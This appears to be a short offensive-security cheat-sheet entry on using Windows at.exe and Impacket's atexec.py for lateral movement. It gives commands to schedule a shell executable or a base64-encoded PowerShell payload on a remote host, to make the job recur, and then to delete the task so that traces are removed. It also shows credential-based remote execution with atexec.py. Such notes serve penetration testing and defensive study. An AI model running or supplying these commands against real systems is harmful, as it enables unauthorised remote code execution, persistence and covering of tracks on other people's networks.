# At

Search Tag(s): #lateral-movement #schedule-task #windows

## 01 - Living off the Land

### 1.1 - Syntax

```
C:\> at.exe <HH:mm> /interactive /every:<m | t | w | th | f | s | su> C:\path\to\shell.exe
```

### 1.2 - Usage

- Retrieve local time in order to create a schedule task.

```
C:\> net.exe time \\<IP>

PS C:\> Invoke-Command [-ComputerName <IP>] -ScriptBlock {Get-Date}
```

- Create a schedule task.

```
C:\> at.exe [\\<IP>] <HH:mm> /interactive /every:m,t,w,th,f,s,su C:\path\to\shell.exe

C:\> at.exe [\\<IP>] <HH:mm> "powershell.exe -E <base64_payload>"
```

- Cleanup the schedule by querying the current computer and then delete the identifier number.

```
C:\> at.exe [\\<IP>]

C:\> at.exe [\\<IP>] <id> /delete /yes
```

## 02 - Impacket

`$ atexec.py <username>:<password>@<IP>`

---
## References

- [Impacket Remote Execution Tools - atexec.py](https://u0041.co/blog/post/1)